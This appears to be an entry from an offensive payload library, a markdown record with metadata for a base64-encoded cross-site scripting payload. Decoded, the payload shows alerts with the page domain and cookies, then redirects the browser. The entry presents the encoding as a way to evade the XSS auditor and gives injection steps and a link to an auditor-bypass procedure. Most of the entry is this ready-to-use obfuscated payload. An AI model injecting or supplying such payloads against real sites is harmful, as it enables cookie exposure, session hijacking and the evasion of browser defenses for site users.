---
id: cmd-base64-xss
data: >-
  <script>eval(atob('YWxlcnQoJ1hTUyBQT0MnKTthbGVydCgnRG9tYWluOiAnK2RvY3VtZW50LmRvbWFpbik7YWxlcnQoJ1lvdXIgQ29va2llczpcbicrZG9jdW1lbnQuY29va2llKTt0b3AubG9jYXRpb24uaHJlZj0naHR0cDovL2V4YW1wbGUuY29tJzs='))</script>
tags:
  - payload
  - encoded
type: command
output: null
executor: html
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:20.768Z'
verified: false
validated: true
submitted: true
---
# base64-xss-payload

## Command

```html
<script>eval(atob('YWxlcnQoJ1hTUyBQT0MnKTthbGVydCgnRG9tYWluOiAnK2RvY3VtZW50LmRvbWFpbik7YWxlcnQoJ1lvdXIgQ29va2llczpcbicrZG9jdW1lbnQuY29va2llKTt0b3AubG9jYXRpb24uaHJlZj0naHR0cDovL2V4YW1wbGUuY29tJzs='))</script>
```

## Description

Injected script using base64 to evade auditor, decoding to execute alerts and redirect.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| atob | Base64 decoder | Yes |
| eval | JS executor | Yes |

## Examples

### Basic Usage

Inject into URL path via redirect.

## Expected Output

Decoded JS runs: alerts and redirect.

## Related

- [[procedures/Demonstrate-XSS-Auditor-Bypass-POC]]
